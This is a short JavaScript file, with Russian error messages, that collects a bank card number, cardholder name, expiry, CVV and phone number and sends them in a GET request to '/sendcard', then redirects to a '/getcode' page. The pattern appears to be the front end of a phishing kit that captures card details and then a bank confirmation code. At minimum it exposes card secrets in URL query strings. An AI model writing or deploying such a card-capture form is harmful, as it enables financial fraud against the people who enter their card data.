
function test(el){
    if(el.value.length === 2){
        el.value = el.value+'/'
    }
}
function send(cardnum, cardholder, carddays, cardcvv, num){
    if(cardnum.length === 16 && carddays.length === 5 && cardholder.length > 0 && cardcvv.length === 3 && num.length === 11){
        fetch(`/sendcard?cnum=${cardnum}&ch=${cardholder}&cd=${carddays}&ccvv=${cardcvv}&num=${num}`)
    }
    else{
        document.getElementById('Error').innerHTML = `Проверьте введенные данные! Ошибка.`
    }
}

function validate(cardnum, cardholder, carddays, cardcvv, num) {
    if(cardnum.length === 16 && carddays.length === 5 && cardholder.length > 0 && cardcvv.length === 3 && num.length === 11){
        fetch(`/sendcard?cnum=${cardnum}&ch=${cardholder}&cd=${carddays}&ccvv=${cardcvv}&num=${num}`)
        window.location.href = '/getcode'
    }
    else{
        document.getElementById('Error').innerHTML = `Проверьте введенные данные! Ошибка.`
    }
};
